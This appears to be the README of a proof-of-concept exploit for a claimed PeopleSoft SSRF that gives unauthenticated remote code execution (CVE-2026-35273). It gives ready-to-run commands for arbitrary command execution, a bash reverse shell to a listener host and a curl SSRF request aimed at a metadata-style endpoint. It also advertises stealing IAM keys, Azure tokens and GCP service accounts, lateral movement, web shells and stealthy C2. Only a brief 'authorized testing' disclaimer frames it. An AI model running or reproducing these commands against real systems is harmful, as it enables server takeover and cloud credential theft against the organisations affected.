# POC_cve_2026_35273

Universal Unauthenticated RCE via PeopleSoft SSRF

DISCLAIMER:

FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY 

 Usage Examples :
 ```bash
# Basic command execution
python3 exploit.py -u https://any-pplsoft.com -c "whoami"

# Interactive reverse shell
python3 exploit.py -u https://target.ps.com -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" --shell --lhost 10.0.0.1 --lport 4444

# Manual SSRF testing (if automation fails)
curl -k -X POST https://target.com/PSIGW/HttpListeningConnector \
  -H "Content-Type: application/xml" \
  -d '<Envelope><Body><EnvironmentManagement><sourceURL>http://167.224.167.224/latest/meta-data/</sourceURL></EnvironmentManagement></Body></Envelope>'
```
Features and	Why they Matter

```
Auto cloud detection	Works on AWS, Azure, GCP, or on‑prem without modification

Multi‑stage SSRF	Probes internal services for lateral movement

Credential theft	Steals IAM keys, Azure tokens, or GCP service accounts

Multiple RCE paths	SSM, RunCommand, web shells, reverse shells

Stealthy C2	Uses cloud APIs, not raw sockets
```
